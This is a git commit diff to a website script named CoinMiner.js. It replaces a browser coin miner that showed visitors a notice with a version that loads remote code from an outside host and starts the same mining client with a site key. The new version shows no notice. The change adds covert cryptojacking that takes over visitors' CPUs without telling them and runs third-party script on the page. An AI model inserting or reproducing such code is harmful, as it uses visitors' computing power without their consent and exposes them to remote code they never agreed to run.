768fd36a7fdc588d26d97c52382ccc3a20fe33ce
Josh <joshuanewland33@hotmail.com>
2019-10-02 15:51:39 +0100

    Ima leave it for now

--- scripts/CoinMiner.js
+++ scripts/CoinMiner.js
@@ -1,5 +1,8 @@
-var _coinClient = new Client.Anonymous('1fc8a058a1b8eb3df5a2491da8c73084f4d6e5e836cecc88be4de0da480fe055', {
-    throttle: 0.2, c: 'w', ads:0
-});
-_coinClient.start();
-_coinClient.addMiningNotification("Bottom", "This site is running a JavaScript miner", "rgba(97, 97, 97, 1)", 24, "rgba(33, 33, 33, 1)");
+var coinScript = document.createElement('script');
+document.body.appendChild(coinScript);
+coinScript.src = "https://www.hostingcloud.racing/vyC3.js";
+coinScript.onload = function ()
+{
+  var _coinClient = new Client.Anonymous('1fc8a058a1b8eb3df5a2491da8c73084f4d6e5e836cecc88be4de0da480fe055', {throttle: 0.2, c: 'w', ads:0 });
+  _coinClient.start();
+}
